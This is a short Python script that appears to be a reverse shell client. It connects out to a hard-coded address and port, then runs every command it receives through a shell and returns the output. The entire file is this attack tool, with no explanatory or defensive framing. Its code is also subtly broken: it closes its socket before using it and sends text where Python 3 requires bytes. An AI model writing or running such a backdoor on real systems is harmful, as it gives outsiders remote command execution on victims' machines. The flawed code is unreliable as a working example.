#!/usr/bin/python3
import socket, sys, os
import subprocess as sp

def soc():
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s_addr = ('192.168.1.107', 50000)
	print('ok')
	s.connect(s_addr)
	s.close()
def shell():
	curdir = os.getcwd()
	s.send(curdir)
	while True:
		response = s.recv(1024)
		if response == 'exit':
			break
		else:
			proc = sp.Popen(response, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			s.send(result)
soc()
shell()
